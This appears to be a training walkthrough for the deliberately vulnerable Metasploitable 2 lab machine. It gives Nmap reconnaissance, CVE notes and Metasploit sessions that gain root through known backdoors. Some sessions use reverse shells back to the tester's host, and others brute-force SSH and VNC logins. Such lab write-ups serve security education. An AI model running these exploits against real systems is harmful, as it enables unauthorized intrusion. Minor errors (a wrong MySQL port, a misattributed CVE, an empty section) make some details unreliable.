# Metasploitable 2 Walkthrough : Exploitation Guide


## Metasploitable 2 :
Metasploitable 2 is an intentionally vulnerable virtual machine designed for training, exploit testing, and general target practice. Unlike other vulnerable virtual machines, Metasploitable focuses on vulnerabilities at the operating system and network services layer instead of custom, vulnerable applications.

## Intelligence Gathering

### Host Disovery : 

```
nmap -sn -oN host-discovery 192.168.67.129
```
```
# Nmap 7.94SVN scan initiated as: nmap -sn -oN host-discovery 192.168.67.129
Nmap scan report for 192.168.67.129
Host is up (0.00044s latency).
```

### Port Scan : 

```
nmap -sV -O -v -p1-65535 -oN port-scan 192.168.67.129
```
```
# Nmap 7.94SVN scan initiated as: nmap -sV -O -v -p1-65535 -oN port-scan 192.168.67.129
Nmap scan report for 192.168.67.129
Host is up (0.00076s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
35794/tcp open  java-rmi    GNU Classpath grmiregistry
42479/tcp open  status      1 (RPC #100024)
45941/tcp open  nlockmgr    1-4 (RPC #100021)
52228/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 00:0C:29:41:2E:65 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 0.139 days ()
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=207 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```



### Service scan : 

```
nmap -A -PN -sU -sS -T2 -v -oN service-scan 192.168.67.129
```
```
# Nmap 7.94SVN scan initiated as: nmap -A -PN -sU -sS -T2 -v -oN service-scan 192.168.67.129
Increasing send delay for 192.168.67.129 from 400 to 800 due to 11 out of 23 dropped probes since last increase.
Nmap scan report for 192.168.67.129
Host is up (0.00071s latency).
Not shown: 993 closed udp ports (port-unreach), 977 closed tcp ports (reset)
PORT     STATE         SERVICE     VERSION
21/tcp   open          ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.67.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open          ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open          telnet      Linux telnetd
25/tcp   open          smtp        Postfix smtpd
|_ssl-date: 2025-04-05T13:24:41+00:00; -5h29m58s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
53/tcp   open          domain      ISC BIND 9.4.2
80/tcp   open          http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
111/tcp  open          rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      36667/udp   mountd
|   100005  1,2,3      53657/tcp   mountd
|   100021  1,3,4      52348/tcp   nlockmgr
|   100021  1,3,4      59975/udp   nlockmgr
|   100024  1          42563/udp   status
|_  100024  1          44620/tcp   status
139/tcp  open          netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open          netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open          exec        netkit-rsh rexecd
513/tcp  open          login?
514/tcp  open          tcpwrapped
1099/tcp open          java-rmi    GNU Classpath grmiregistry
1524/tcp open          bindshell   Metasploitable root shell
2049/tcp open          nfs         2-4 (RPC #100003)
2121/tcp open          ftp         ProFTPD 1.3.1
3306/tcp open          mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 25
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, LongColumnFlag, SupportsTransactions, SupportsCompression, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: roXH@H+<*_~}wa\+_|sN
5432/tcp open          postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2025-04-05T13:24:35+00:00; -5h29m59s from scanner time.
5900/tcp open          vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp open          X11         (access denied)
6667/tcp open          irc         UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 1:03:41
|   source ident: nmap
|   source host: D85379FA.AE49E409.FFFA6D49.IP
|_  error: Closing Link: mcvzzmgeg[192.168.67.128] (Quit: mcvzzmgeg)
8009/tcp open          ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open          http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/5.5
|_http-favicon: Apache Tomcat
53/udp   open          domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
|_dns-recursion: Recursion appears to be enabled
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
111/udp  open          rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      36667/udp   mountd
|   100005  1,2,3      53657/tcp   mountd
|   100021  1,3,4      52348/tcp   nlockmgr
|   100021  1,3,4      59975/udp   nlockmgr
|   100024  1          42563/udp   status
|_  100024  1          44620/tcp   status
137/udp  open          netbios-ns  Microsoft Windows netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces: 
|   hostname: METASPLOITABLE
|   interfaces: 
|_    192.168.67.129
138/udp  open|filtered netbios-dgm
2049/udp open          nfs         2-4 (RPC #100003)
MAC Address: (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 0.042 days
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=194 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN, METASPLOITABLE; OSs: Unix, Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -4h29m46s, deviation: 2h00m23s, median: -5h29m58s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2025-04-05T09:24:27-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   METASPLOITABLE<00>   Flags: <unique><active>
|   METASPLOITABLE<03>   Flags: <unique><active>
|   METASPLOITABLE<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.71 ms 192.168.67.129

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## Vulnerability Analysis

### 1524 bindshell : metasploitable root no password

The port 1524 bindshell has a backdoor of root account with no password required to login as the root.

### 21 ftp : vsftpd 2.3.4

- **CVE-2011-2523**
    - vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp.

The VSFTPD service running on the system has a backdoor which can be used to gain a root shell on the system. This can be exploited by using the VSFTPD v2.3.4 Backdoor Command Execution module.

```
nmap -p 21 --script ftp-vsftpd-backdoor.nse  192.168.67.129 -oA vsftpd
```
```    
# Nmap 7.94SVN scan initiated as: nmap -p 21 --script ftp-vsftpd-backdoor.nse -oN vsftpd 192.168.67.129
Nmap scan report for 192.168.67.129
Host is up (0.00076s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|_      https://www.securityfocus.com/bid/48539
MAC Address: (VMware)
```

- metasploit
    - exploit/unix/ftp/vsftpd_234_backdoor
    - payload/cmd/unix/interact
---
### 22 ssh : OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

https://github.com/sec-jarial/OpenSSH_4.7p1-Exploit <br>
https://nvd.nist.gov/vuln/detail/cve-2008-5161

- **CVE-2008-5161**:
    Error handling in the SSH protocol in (1) SSH Tectia Client and Server and Connector 4.0 through 4.4.11, 5.0 through 5.2.4, and 5.3 through 5.3.8; Client and Server and ConnectSecure 6.0 through 6.0.4; Server for Linux on IBM System z 6.0.4; Server for IBM z/OS 5.5.1 and earlier, 6.0.0, and 6.0.1; and Client 4.0-J through 4.3.3-J and 4.0-K through 4.3.10-K; and (2) OpenSSH 4.7p1 and possibly other versions, when using a block cipher algorithm in Cipher Block Chaining (CBC) mode, makes it easier for remote attackers to recover certain plaintext data from an arbitrary block of ciphertext in an SSH session via unknown vectors.

- Metasploit 
    - use auxiliary/scanner/ssh/ssh_login
    - set userpass_file /usr/share/wordlists/metasploit/piata_ssh_userpass.txt
---
### 53 dns : ISC BIND 9.4.2

- **CVE-2008-1447**
    - The DNS protocol, as implemented in (1) BIND 8 and 9 before 9.5.0-P1, 9.4.2-P1, and 9.3.5-P1; (2) Microsoft DNS in Windows 2000 SP4, XP SP2 and SP3, and Server 2003 SP1 and SP2; and other implementations allow remote attackers to spoof DNS traffic via a birthday attack that uses in-bailiwick referrals to conduct cache poisoning against recursive resolvers, related to insufficient randomness of DNS transaction IDs and source ports, aka "DNS Insufficient Socket Entropy Vulnerability" or "the Kaminsky bug."

- **CVE-2008-4194**
    - The p_exec_query function in src/dns_query.c in pdnsd before 1.2.7-par allows remote attackers to cause a denial of service (daemon crash) via a long DNS reply with many entries in the answer section, related to a "dangling pointer bug."

- https://ftp.isc.org/isc/bind9/9.4.2/ 
- https://www.exploit-db.com/exploits/6122


---
### 80 http : Apache httpd 2.2.8 ((Ubuntu) DAV/2)

- This version of Apache httpd server contains so many vulnerabilities that can be found in the following link:
    - https://httpd.apache.org/security/vulnerabilities_22.html


---
### 1099 java-rmi : GNU Classpath grmiregistry
GNU Classpath is a set of essential libraries for supporting the Java programming language. This VM runs a remote object registry for GNU Classpath using default credentials which can be leveraged to gain a shell on the machine using the Java RMI Server Insecure Default Configuration Java Code Execution Metasploit module.

- metasploit 
    - use exploit/multi/misc/java_rmi_server

---
### 445 netbios-ssn : Samba smbd 3.0.20-Debian

- **CVE-2007-2447**
    The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.

- metasploit 
    - scanner/smb/smb_version
    - exploit/multi/samba/usermap_script

https://medium.com/@uukail2005/samba-smbd-3-x-4-x-exploitation-59a8d9431ea1

---
### 6667 irc : Unreal IRCd Backdoor Detection

- **CVE-2010-2075**
    - UnrealIRCd 3.2.8.1, as distributed on certain mirror sites from November 2009 through June 2010, contains an externally introduced modification (Trojan Horse) in the DEBUG3_DOLOG_SYSTEM macro, which allows remote attackers to execute arbitrary commands.
    - https://www.exploit-db.com/exploits/16922
- metasploit
    - exploit/unix/irc/unreal_ircd_3281_backdoor

- Nmap
```
# Nmap 7.94SVN scan initiated as: nmap -p 6667 --script irc-unrealircd-backdoor.nse -oN unrealircdbackdoor 192.168.67.129
Nmap scan report for 192.168.67.129
Host is up (0.00064s latency).

PORT     STATE SERVICE
6667/tcp open  irc
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
MAC Address:  (VMware)


```


---
### 2121 ftp : ProFTPD 1.3.1

- **CVE-2008-4242**
    - ProFTPD 1.3.1 interprets long commands from an FTP client as multiple commands, which allows remote attackers to conduct cross-site request forgery (CSRF) attacks and execute arbitrary FTP commands via a long ftp:// URI that leverages an existing session from the FTP client implementation in a web browser.
    - http://bugs.proftpd.org/show_bug.cgi?id=3115

- **CVE-2009-0542**
    - SQL injection vulnerability in ProFTPD Server 1.3.1 through 1.3.2rc2 allows remote attackers to execute arbitrary SQL commands via a "%" (percent) character in the username, which introduces a "'" (single quote) character during variable substitution by mod_sql.
    - https://www.exploit-db.com/exploits/8037
    - https://www.exploit-db.com/exploits/32798
- 

### 5432 postgresql : PostgreSQL DB 8.3.0 - 8.3.7

- **CVE-2012-0868**
    - CRLF injection vulnerability in pg_dump in PostgreSQL 8.3.x before 8.3.18, 8.4.x before 8.4.11, 9.0.x before 9.0.7, and 9.1.x before 9.1.3 allows user-assisted remote attackers to execute arbitrary SQL commands via a crafted file containing object names with newlines, which are inserted into an SQL script that is used when the database is restored.
    - https://bernardodamele.blogspot.com/2009/01/command-execution-with-postgresql-udf.html
    - https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/7855.tar.gz (2009-lib_postgresqludf_sys_0.0.1.tar.gz)

- **CVE-2012-0866**
    - CREATE TRIGGER in PostgreSQL 8.3.x before 8.3.18, 8.4.x before 8.4.11, 9.0.x before 9.0.7, and 9.1.x before 9.1.3 does not properly check the execute permission for trigger functions marked SECURITY DEFINER, which allows remote authenticated users to execute otherwise restricted triggers on arbitrary data by installing the trigger on an attacker-owned table.


### 8787 drb : Ruby DRb RMI

The dRuby RMI server running on the system has a few remote code execution vulnerabilities which can be exploited using the Distributed Ruby Send instance_eval/syscall Code Execution Metasploit module.

- metasploit 
    - exploit/linux/misc/drb_remote_codeexec

## Exploitation

### 21 ftp : vsftpd 2.3.4

**Exploited**
```
[msf](Jobs:0 Agents:0) >> use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set payload payload/cmd/unix/interact
payload => cmd/unix/interact
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOST 192.168.105.129
RHOST => 192.168.105.129
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> exploit
[*] 192.168.105.129:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.105.129:21 - USER: 331 Please specify the password.
[+] 192.168.105.129:21 - Backdoor service has been spawned, handling...
[+] 192.168.105.129:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.105.128:35077 -> 192.168.105.129:6200) at 2025-04-10 23:05:51 +0530


```

### 22 ssh Brute Force Attack 

**Exploited**
```
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ssh/ssh_login
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set userpass_file /usr/share/wordlists/metasploit/piata_ssh_userpass.txt
userpass_file => /usr/share/wordlists/metasploit/piata_ssh_userpass.txt
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set RHOST 192.168.105.129
RHOST => 192.168.105.129
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set stop_on_success true
stop_on_success => true
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set threads 12
threads => 12
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set verbose false
verbose => false
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> exploit
[*] 192.168.105.129:22 - Starting bruteforce
[+] 192.168.105.129:22 - Success: 'user:user' 'uid=1001(user) gid=1001(user) groups=1001(user) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 2 opened (192.168.105.128:34151 -> 192.168.105.129:22) at 2025-04-10 23:33:16 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

### 1524 bindshell : metasploitable root no password

**Exploited**
```
telnet 192.168.105.129 1524
Trying 192.168.105.129...
Connected to 192.168.105.129.
Escape character is '^]'.
root@metasploitable:/# ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
root@metasploitable:/# root@metasploitable:/# 

```


### 1099 java-rmi : GNU Classpath grmiregistry

**Exploited**

```
[msf](Jobs:0 Agents:1) >> use exploit/multi/misc/java_rmi_server
[*] Using configured payload java/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(multi/misc/java_rmi_server) >> set RHOST 192.168.105.129
RHOST => 192.168.105.129
[msf](Jobs:0 Agents:1) exploit(multi/misc/java_rmi_server) >> run
[*] Started reverse TCP handler on 192.168.105.128:4444 
[*] 192.168.105.129:1099 - Using URL: http://192.168.105.128:8080/RQaNLEoj8QEX
[*] 192.168.105.129:1099 - Server started.
[*] 192.168.105.129:1099 - Sending RMI Header...
[*] 192.168.105.129:1099 - Sending RMI Call...
[*] 192.168.105.129:1099 - Replied to request for payload JAR
[*] Sending stage (58073 bytes) to 192.168.105.129
[*] Meterpreter session 3 opened (192.168.105.128:4444 -> 192.168.105.129:32792) at 2025-04-10 23:50:04 +0530

(Meterpreter 3)(/) > getuid
Server username: root
(Meterpreter 3)(/) > 


```

### 445 netbios-ssn : Samba smbd 3.0.20-Debian

**Exploited**
```
[msf](Jobs:0 Agents:0) >> use exploit/multi/samba/usermap_script
[*] Using configured payload cmd/unix/reverse_netcat
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOST 192.168.105.129
RHOST => 192.168.105.129
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RPORT 445
RPORT => 445
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit
[*] Started reverse TCP handler on 192.168.105.128:4444 
[*] Command shell session 5 opened (192.168.105.128:4444 -> 192.168.105.129:58057) at 2025-04-11 00:02:02 +0530

whoami
root

```

### 6667 irc : Unreal IRCd Backdoor Detection

**Exploited**
```
[msf](Jobs:0 Agents:0) >> use exploit/unix/irc/unreal_ircd_3281_backdoor
[*] Using configured payload cmd/unix/reverse
[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> set RHOST 192.168.105.129
RHOST => 192.168.105.129
[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> set LHOST 192.168.105.128
LHOST => 192.168.105.128
[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> run
[*] Started reverse TCP double handler on 192.168.105.128:4444 
[*] 192.168.105.129:6667 - Connected to 192.168.105.129:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.105.129:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo GlqV5ObT1SptNoWf;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "GlqV5ObT1SptNoWf\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 7 opened (192.168.105.128:4444 -> 192.168.105.129:35581) at 2025-04-11 00:09:43 +0530

id
uid=0(root) gid=0(root)


```

### 8787 drb : Ruby DRb RMI

**Exploited**
```

```

### 5900 vnc Brute Force Attack

**Exploited**
```
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/vnc/vnc_login 
[msf](Jobs:0 Agents:0) auxiliary(scanner/vnc/vnc_login) >> set RHOST 192.168.105.129
RHOST => 192.168.105.129
[msf](Jobs:0 Agents:0) auxiliary(scanner/vnc/vnc_login) >> run
[*] 192.168.105.129:5900  - 192.168.105.129:5900 - Starting VNC login sweep
[!] 192.168.105.129:5900  - No active DB -- Credential data will not be saved!
[+] 192.168.105.129:5900  - 192.168.105.129:5900 - Login Successful: :password
[*] 192.168.105.129:5900  - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

### 3360 mysql Brute Force

Using Nmap Script Engine

nmap -p 3360 --script mysql-brute.nse 192.168.105.129 -oN mysql-brute

auxiliary/scanner/mysql/mysql_login